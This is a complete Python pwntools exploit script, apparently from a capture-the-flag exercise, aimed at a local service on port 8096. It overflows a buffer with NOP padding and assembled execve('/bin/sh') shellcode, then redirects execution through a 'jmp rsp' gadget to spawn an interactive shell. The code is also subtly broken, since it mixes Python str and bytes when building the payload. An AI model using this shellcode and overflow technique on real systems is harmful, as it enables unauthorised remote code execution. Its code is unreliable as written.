#!/usr/bin/env python3

from pwn import *
from pwnlib.util.packing import p64, u64

context.arch = 'amd64'

def main():
    p = remote('127.0.0.1', 8096)
    
    jmp_rsp = 0x40185d

    shellcode = '''
        lea rdi, [rsi + 4]
        mov rdx, rax
        mov rsi, rax
        mov al, 59
        syscall
    '''

    shellcode = asm(shellcode)

    payload = 'done'
    payload += '/bin/sh\x00'
    payload += '\x90'*(28-len(shellcode)) 
    payload += shellcode
    payload = payload.encode('utf-8') + p64(jmp_rsp) + '\xeb\xe2'

    p.sendline(payload)

    p.interactive()

if __name__ == '__main__':
    main()